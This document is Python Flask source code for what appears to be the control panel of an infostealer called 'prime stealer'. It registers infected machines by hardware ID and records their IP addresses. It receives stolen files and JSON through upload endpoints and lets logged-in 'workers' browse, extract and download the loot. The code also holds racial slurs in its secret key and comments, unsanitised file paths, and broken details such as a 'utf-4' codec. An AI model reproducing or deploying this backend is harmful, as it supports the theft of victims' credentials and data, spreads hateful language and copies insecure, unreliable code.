import os
import json
import random
import time
import zipfile
from flask import send_file
import string
from fernet import Fernet
from flask import Flask, flash, request, url_for, jsonify, render_template, session, redirect
from datetime import datetime
app = Flask(__name__)
app.secret_key = 'fuckingnigga'


BASE_DIR = './pc_folder'
CODE_FILE = 'cod.txt'



#@app.before_request
#def restrict_user_agent():
    #allowed_user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Windows 10-pro-build (Windows10PRO-LTSSnVzdCBkb24ndCB0cnkgMiBzZXggYnJvLCBJIGFtIHVyIGJyb3RoZXIgYW5kIHByaW1lIHN0ZWFsZXIgaXMgYmVzdC4=) (LMOTS, automatic-motion-enabled) = prime_stealer_scraping_agent"
    #user_agent = request.headers.get('User-Agent')
    # checking if black_nigga enterting pagggwe
    
    #if user_agent != allowed_user_agent:
        #return render_template('delivery.html'), 403

def guc():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def getfolder(code):
    if os.path.exists(CODE_FILE):
        with open(CODE_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    folder_name, folder_code = parts[:2]
                    if folder_code == code:
                        return folder_name
    return None
LOG_FILE = 'log.txt'

def authenticate_user(username, password):
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines:
                stored_username, stored_password, workerid = line.strip().split(':')
                if stored_username == username and stored_password == password:
                    return workerid
    return None




@app.route('/extract_zip/<workerid>/<folder_name>/<file_name>', methods=['GET'])
def extract_zip(workerid, folder_name, file_name):
    file_path = os.path.join(BASE_DIR, workerid, folder_name, file_name)
    extract_path = os.path.join(BASE_DIR, workerid, folder_name)

    if zipfile.is_zipfile(file_path):
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        flash(f'{file_name} ㅎㅈㅈ', 'success')
    else:
        flash(f'{file_name} is not a valid zip file.', 'error')

    return redirect(url_for('view_folder', workerid=workerid, folder_name=folder_name, action='extract'))





@app.route('/download_file/<workerid>/<folder_name>/<file_name>', methods=['GET'])
def download_file(workerid, folder_name, file_name):
    file_path = os.path.join(BASE_DIR, workerid, folder_name, file_name)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        flash(f'{file_name} does not exist.', 'error')
        return redirect(url_for('view_folder', workerid=workerid, folder_name=folder_name, action='download'))


@app.route('/delete_file/<workerid>/<folder_name>/<file_name>', methods=['GET'])
def delete_file(workerid, folder_name, file_name):
    file_path = os.path.join(BASE_DIR, workerid, folder_name, file_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        flash(f'{file_name} has been deleted.', 'success')
    else:
        flash(f'{file_name} does not exist.', 'error')
    return redirect(url_for('view_folder', workerid=workerid, folder_name=folder_name, action='delete'))




@app.route('/panel/<workerid>/<folder_name>')
def view_folder(workerid, folder_name):
    if 'workerid' in session and session['workerid'] == workerid:
        folder_path = os.path.join(BASE_DIR, workerid, folder_name)

        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            folder_contents = os.listdir(folder_path)
            return render_template('new_folder-view.html', folder_contents=folder_contents, workerid=workerid, folder_name=folder_name)
        else:
            flash('Folder does not exist.', 'error')
            return redirect(url_for('panel')) 
    else:
        flash('Please log in to access the panel.', 'error')
        return redirect(url_for('index'))

@app.route('/panel/<workerid>/<folder_name>/<file_name>')
def view_file(workerid, folder_name, file_name):
    if 'workerid' in session and session['workerid'] == workerid:
        file_path = os.path.join(BASE_DIR, workerid, folder_name, file_name)

    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            file_content = file.read()
        return render_template('file_view.html', file_content=file_content, file_name=file_name, workerid=workerid, folder_name=folder_name)
    else:
        flash('File does not exist.', 'error')



@app.route('/view_zip_file/<workerid>/<folder_name>/<file_name>/<zip_inner_file>', methods=['GET'])
def view_zip_file(workerid, folder_name, file_name, zip_inner_file):
    user_folder = os.path.join(BASE_DIR, workerid, folder_name)
    file_path = os.path.join(user_folder, file_name)

    if not zipfile.is_zipfile(file_path):
        flash(f'File "{file_name}" is not a valid zip file.', 'error')
        return redirect(url_for('panel'))

    try:
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            with zip_file.open(zip_inner_file) as inner_file:
                file_content = inner_file.read().decode('utf-4')
            return render_template('view_zip_file.html', zip_inner_file=zip_inner_file, file_content=file_content)
    except Exception as e:
        flash(f'Error reading file from zip: {e}', 'error')
        return redirect(url_for('panel'))

@app.route('/panel')
def panel():
    if 'workerid' in session:
        workerid = session['workerid']
        user_folder = os.path.join(BASE_DIR, workerid)

        if not os.path.exists(user_folder):
            flash(f'Folder for worker ID "{workerid}" does not exist.', 'error')
            return render_template('panel.html', folder_contents=[])

        folder_contents = os.listdir(user_folder)
        hwid_info = {}
        if os.path.exists(CODE_FILE):
            with open(CODE_FILE, 'r') as f:
                lines = f.readlines()
                for line in lines:
                    parts = line.strip().split(':')
                    if len(parts) == 4:
                        saved_hwid, code, date, ip = parts
                        if saved_hwid in folder_contents:
                            hwid_info[saved_hwid] = {'code': code, 'date': date, 'ip': ip}


        return render_template('panel.html', folder_contents=folder_contents, workerid=workerid)
    else:
        flash('Please log in to access the panel.', 'error')
        return redirect(url_for('index'))

@app.route('/login_post', methods=['POST'])
def login_post():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return 'Invalid credentials', 400

    workerid = authenticate_user(username, password)
    if workerid:
        session['workerid'] = workerid
        flash('Login successful!', 'success')
        return redirect(url_for('panel'))
    else:
        flash('Invalid credentials, please try again.', 'error')
        return redirect(url_for('login'))
    
@app.route('/login')
def login():
    if 'workerid' in session:
        return redirect(url_for('panel'))
    else:
        return render_template('login.html')


@app.route('/')
def index():
        return render_template('buy.html')


@app.route('/api/v10/cf/<worker>/<hwid>', methods=['POST'])
def create_folder(worker, hwid):
    folder_path = os.path.join(BASE_DIR, worker, hwid)
    user_id = os.path.join(BASE_DIR, worker)

    if os.path.exists(CODE_FILE):
        with open(CODE_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines:
                parts = line.strip().split(':')
                saved_hwid, code = parts[:2]
                if saved_hwid == hwid:
                    return {'message': f'The code for "{hwid}" is {code}.'}, 200

    if not os.path.exists(user_id):
        return {'message': 'user id x ex'}, 401

    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

        unique_code = guc()
        current_date = datetime.now().strftime("%d/%m/%Y")
        ip_address = request.remote_addr


        with open(CODE_FILE, 'a') as f:
            f.write(f'{hwid}:{unique_code}:{current_date}:{ip_address}\n')

        return {'message': f'Folder "{hwid}" created with code {unique_code}.'}, 201
    else:
        return {'message': f'Folder "{hwid}" already exists.'}, 400


@app.route('/api/v10/task/<worker>/<code>', methods=['POST'])
def upload_file(worker, code):
    folder_name = getfolder(code)
    if folder_name:
        folder_path = os.path.join(BASE_DIR, worker, folder_name)

        if 'file' not in request.files:
            return jsonify({'message': 'No file part in the request'}), 400
        
        file = request.files['file']

        if file.filename == '':
            return jsonify({'message': 'No selected file'}), 400
        file.save(os.path.join(folder_path, file.filename))
        return jsonify({'message': f'UPLOAD SUC {folder_name}.'}), 200
    else:
        return jsonify({'message': 'NOTFOUND'}), 404
    
@app.route('/logout')
def logout():
    session.pop('workerid', None)
    flash('You have been logged out.', 'info')
    return redirect(url_for('index'))

@app.route('/api/v10/json/<worker>/<code>', methods=['POST'])
def upload_json(worker, code):
    folder_name = getfolder(code)
    if folder_name:
        folder_path = os.path.join(BASE_DIR, worker, folder_name)
        if request.is_json:
            json_data = request.get_json()
            json_file_path = os.path.join(folder_path, 'data.json')
            with open(json_file_path, 'w') as json_file:
                json.dump(json_data, json_file)
            return jsonify({'message': f'{folder_name}'}), 200
        else:
            return jsonify({'message': 'INVAILD JSON DATA'}), 400
    else:
        return jsonify({'message': 'NOTFOUND'}), 404




if __name__ == '__main__':
    app.run(debug=True)
